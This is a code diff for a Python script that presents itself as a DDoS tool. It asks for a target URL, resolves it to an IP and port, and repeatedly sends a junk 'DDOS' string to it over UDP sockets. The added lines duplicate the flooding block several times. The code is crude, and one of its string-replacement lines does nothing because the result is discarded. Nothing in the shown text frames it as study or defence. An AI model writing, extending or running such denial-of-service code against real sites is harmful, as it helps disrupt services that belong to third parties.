@@ -1,3 +1,7 @@
+
+import socket
+import os
+
 target = input(f"{green}Enter Target URL: ")
 target.replace("http://", "")
 target.replace("https://","")
@@ -8,4 +12,12 @@ joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyg
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.sendto(bytes(joker,"UTF-8"), (ip,port))
-p
+print(port,"IP site address >>",ip)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(bytes(joker,"UTF-8"), (ip,port))
+print(port,"IP site address >>",ip)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(bytes(joker,"UTF-8"), (ip,port))
+print(port,"IP site address >>",ip)
